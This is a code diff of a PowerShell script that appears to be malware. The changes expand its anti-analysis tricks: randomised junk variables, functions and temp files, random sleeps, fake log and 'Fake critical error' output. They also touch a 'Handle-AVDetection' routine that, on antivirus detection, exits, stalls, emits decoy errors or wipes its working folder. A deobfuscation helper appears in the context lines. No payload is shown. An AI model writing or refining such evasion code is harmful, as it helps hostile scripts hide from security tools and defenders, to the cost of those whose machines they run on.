@@ -15,10 +15,11 @@ function DoubleDeobfuscate($obf, $key) {
     [System.Text.Encoding]::Unicode.GetString($bytes)
 }
 function JunkCode {
-    $x = Get-Random -Minimum 1 -Maximum 100
-    $y = [guid]::NewGuid().Guid
-    $z = $x * ($y.Length)
-    if ($z -gt 1000) { Write-Host $z }
+    $junkArr = @(Get-Random, [guid]::NewGuid().ToString(), (Get-Date).Ticks)
+    $junkSum = ($junkArr | Measure-Object -Sum).Sum
+    if ($junkSum -gt 100000) { Write-Verbose $junkSum }
+    $junkSleep = Get-Random -Minimum 10 -Maximum 100
+    Start-Sleep -Milliseconds $junkSleep
 }
 JunkCode
 
@@ -177,14 +178,20 @@ try {
 for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 8); $i++) {
     $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
     Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)
 }
-for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 4); $i++) {
     $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
-    Set-Item -Path "function:$fname" -Value { param($x) return $x * (Get-Random -Minimum 1 -Maximum 100) }
+    Set-Item -Path "function:$fname" -Value { param($x) return ($x + (Get-Random -Minimum 1 -Maximum 100)) }
 }
-for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
     $junkFile = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
-    Set-Content -Path $junkFile -Value ([guid]::NewGuid().ToString()) -Encoding ASCII
+    Set-Content -Path $junkFile -Value ("JUNK" + [guid]::NewGuid().ToString()) -Encoding ASCII
+}
+
+if ((Get-Random) % 2 -eq 0) {
+    Write-Output ("Fake log: " + (Get-Date))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
 }
 
 $me=$MyInvocation.MyCommand.Path
@@ -297,17 +304,18 @@ try {
 } catch {}
 
 function Handle-AVDetection {
-    $behaviors = @("exit", "sleep", "error", "cleanup")
+    $behaviors = @("exit", "sleep", "error", "cleanup", "noop")
     $choice = $behaviors | Get-Random
     switch ($choice) {
         "exit"    { exit }
-        "sleep"   { while ($true) { Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 600) } }
-        "error"   { for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 7); $i++) { Write-Error "Critical error: $([guid]::NewGuid())"; Start-Sleep -Seconds 2 } }
+        "sleep"   { while ($true) { Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300) } }
+        "error"   { for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) { Write-Error "Fake critical error: $([guid]::NewGuid())"; Start-Sleep -Seconds 1 } }
         "cleanup" {
             try {
                 Get-ChildItem -Path $dest -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
             } catch {}
             exit
         }
+        "noop" { Write-Output "No operation performed." }
     }
 }
